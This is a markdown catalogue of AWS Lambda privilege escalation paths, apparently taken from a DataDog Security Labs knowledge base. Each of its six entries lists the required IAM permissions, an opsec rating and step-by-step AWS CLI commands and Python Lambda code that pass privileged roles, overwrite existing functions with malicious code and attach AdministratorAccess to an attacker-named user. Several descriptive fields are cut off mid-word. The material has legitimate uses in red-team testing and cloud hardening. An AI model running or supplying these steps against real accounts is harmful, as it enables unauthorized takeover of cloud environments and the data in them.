# Lambda - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction [added: 2026-04]
- **Tags:** #Iam #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + lambda service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction; A role must exist that trusts lambda.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [lambda-001] A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` can create a new Lambda function and attach an existing IAM Role to it. When the function is invoked, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Create a Lambda function with the privileged role and malicious code
aws lambda create-function --function-name privesc-function --runtime python3.9 --role "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" --handler index.handler --zip-file fileb://exploit.zip

# Step 2: Invoke the function to execute code with elevated privileges
aws lambda invoke --function-name privesc-function output.txt

# Step 3: View the output containing credentials or results of privileged API calls
cat output.txt
```

### iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping [added: 2026-04]
- **Tags:** #Iam #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + lambda service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, lambda:CreateFunction, lambda:CreateEventSourceMapping; A role must exist that trusts lambda.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [lambda-002] A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` can create a Lambda function with a privileged role and configure it to be automatically triggered by an event source (such as DynamoDB streams, Kinesis, or SQS). This allows the attacker to execute code with elevated privileges without manually invoking the function.
- **Payload/Method:**
```
# Step 1: Create a Lambda function with the privileged role
aws lambda create-function --function-name privesc-triggered \
  --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --handler index.handler --zip-file fileb://exploit.zip

# Step 2: Configure the function to be triggered automatically by an event source
aws lambda create-event-source-mapping --function-name privesc-triggered \
  --event-source-arn arn:aws:dynamodb:REGION:ACCOUNT_ID:table/TABLE_NAME/stream/STREAM_ID \
  --starting-position LATEST

# Step 3: Trigger the function by adding an item to the DynamoDB table
aws dynamodb put-item --table-name TABLE_NAME --item '{"id":{"S":"trigger"}}'
```

### lambda:UpdateFunctionCode [added: 2026-04]
- **Tags:** #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; lambda in scope
- **Prereq:** IAM perms: lambda:UpdateFunctionCode; A Lambda function must exist with an administrative execution role (e.g., Admini
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [lambda-003] A principal with `lambda:UpdateFunctionCode` can modify the code of an existing Lambda function that has a privileged execution role. By replacing the function code with malicious code, the attacker can execute arbitrary commands with the privileges of the function's execution role when the function is invoked. This is particularly effective against functions that are automatically triggered by ev
- **Payload/Method:**
```
# Step 1: Create malicious Lambda function code that escalates privileges
echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py

# Step 2: Package the malicious code into a deployment package
zip exploit.zip lambda_function.py

# Step 3: Update the target Lambda function with the malicious code
aws lambda update-function-code --function-name TARGET_FUNCTION \
  --zip-file fileb://exploit.zip

# Step 4: Wait for the function to be invoked by its automatic triggers (EventBridge, S3 events, etc.)
# Wait for the function to be automatically invoked by triggers
```

### lambda:UpdateFunctionCode + lambda:InvokeFunction [added: 2026-04]
- **Tags:** #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; lambda in scope
- **Prereq:** IAM perms: lambda:UpdateFunctionCode, lambda:InvokeFunction; A Lambda function must exist with an administrative execution role (e.g., Admini
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [lambda-004] A principal with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` can modify the code of an existing Lambda function that has a privileged execution role and then manually invoke it. By replacing the function code with malicious code and invoking it, the attacker can execute arbitrary commands with the privileges of the function's execution role immediately, without waiting for automatic tr
- **Payload/Method:**
```
# Step 1: Create malicious Lambda function code that escalates privileges
echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py

# Step 2: Package the malicious code into a deployment package
zip exploit.zip lambda_function.py

# Step 3: Update the target Lambda function with the malicious code
aws lambda update-function-code --function-name TARGET_FUNCTION \
  --zip-file fileb://exploit.zip

# Step 4: Manually invoke the function to execute the privilege escalation
aws lambda invoke --function-name TARGET_FUNCTION output.txt
```

### lambda:UpdateFunctionCode + lambda:AddPermission [added: 2026-04]
- **Tags:** #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; lambda in scope
- **Prereq:** IAM perms: lambda:UpdateFunctionCode, lambda:AddPermission; A Lambda function must exist with an administrative execution role (e.g., Admini
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [lambda-005] A principal with `lambda:UpdateFunctionCode` and `lambda:AddPermission` can modify an existing Lambda function's code with malicious code and grant themselves permission to invoke it via the resource-based policy. The attacker does not need `lambda:InvokeFunction` as an IAM permission because `lambda:AddPermission` grants invocation rights through the function's resource-based policy. This allows 
- **Payload/Method:**
```
# Step 1: Identify the target Lambda function and retrieve its ARN and configuration details
aws lambda get-function \
  --function-name TARGET_FUNCTION \
  --query 'Configuration.FunctionArn' \
  --output text

# Step 2: Create malicious Lambda function code that attaches AdministratorAccess to the starting user
cat > lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    starting_user = 'ATTACKER_USERNAME'

    try:
        iam.attach_user_policy(
            UserName=starting_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Successfully attached AdministratorAccess',
                'user': starting_user
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
EOF

# Step 3: Package the malicious code into a deployment package
zip exploit.zip lambda_function.py

# Step 4: Update the target Lambda function with the malicious code
aws lambda update-function-code \
  --function-name TARGET_FUNCTION \
  --zip-file fileb://exploit.zip

# Step 5: Add a resource-based policy statement allowing the starting principal to invoke the function
aws lambda add-permission \
  --function-name TARGET_FUNCTION \
  --statement-id AllowSelfInvoke \
  --action lambda:InvokeFunction \
  --principal arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USERNAME
```

### iam:PassRole + lambda:CreateFunction + lambda:AddPermission [added: 2026-04]
- **Tags:** #Iam #Lambda #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + lambda service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, lambda:CreateFunction, lambda:AddPermission; A role must exist that trusts lambda.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [lambda-006] A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:AddPermission` can create a new Lambda function with a privileged execution role and grant themselves permission to invoke it via the resource-based policy. The attacker does not need `lambda:InvokeFunction` as an IAM permission because `lambda:AddPermission` grants invocation rights through the function's resource-based policy.
- **Payload/Method:**
```
# Step 1: Discover available roles that trust lambda.amazonaws.com and identify privileged roles
aws iam list-roles \
  --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.Service, `lambda.amazonaws.com`)].{RoleName:RoleName,Arn:Arn}' \
  --output table

# Step 2: Create malicious Lambda function code that attaches AdministratorAccess to the starting user
cat > lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    starting_user = 'ATTACKER_USERNAME'

    try:
        iam.attach_user_policy(
            UserName=starting_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': 'Successfully attached AdministratorAccess',
                'user': starting_user
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
EOF

# Step 3: Package the malicious code into a deployment package
zip exploit.zip lambda_function.py

# Step 4: Create a new Lambda function and pass the privileged role to it as the execution role
aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://exploit.zip \
  --timeout 30

# Step 5: Add a resource-based policy statement allowing the starting principal to invoke the function
aws lambda add-permission \
  --function-name privesc-function \
  --statement-id AllowSelfInvoke \
  --action lambda:InvokeFunction \
  --principal arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USERNAME
```
